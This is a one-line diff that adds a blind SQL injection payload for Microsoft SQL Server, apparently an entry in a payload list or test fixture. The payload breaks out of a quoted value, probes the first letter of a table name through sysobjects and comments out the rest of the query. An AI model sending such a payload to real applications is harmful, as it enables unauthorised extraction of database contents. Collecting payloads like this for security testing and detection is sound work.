@@ -1,0 +1,1 @@
+' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1) = 'a' --
